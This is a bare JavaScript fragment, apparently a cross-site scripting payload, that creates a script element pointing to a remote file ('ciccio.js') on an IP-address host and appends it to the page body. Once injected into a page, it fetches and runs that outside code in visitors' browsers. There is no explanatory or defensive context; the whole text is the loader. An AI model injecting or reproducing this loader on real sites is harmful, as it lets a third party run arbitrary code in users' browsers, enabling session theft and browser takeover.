d=document;
e=d.createElement('script');
e.src="https://192.168.0.2/ciccio.js";
d.body.appendChild(e);

